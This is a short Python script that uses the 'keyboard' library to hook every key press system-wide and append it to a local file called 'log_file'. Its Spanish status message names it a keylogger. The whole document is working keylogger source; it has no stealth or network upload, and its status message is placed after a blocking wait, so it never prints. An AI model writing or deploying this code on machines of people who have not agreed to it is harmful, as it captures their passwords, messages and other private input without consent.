
import keyboard

def teclasPresionadas(key):
        
        with open('log_file', "a") as file:

            if key.name == "space":
                file.write(" ")
            elif key.name == "enter":
                file.write("\n")
            elif key.name == "tab":
                file.write("[TAB]")
            elif key.name == "backspace":
                file.write("[BACKSPACE]")
            elif key.name == "shift":
                file.write("[SHIFT]")
            else:
                file.write(key.name)
keyboard.on_press(teclasPresionadas)
keyboard.wait()
print(f"Keylogger iniciado. Registrando en: log_file")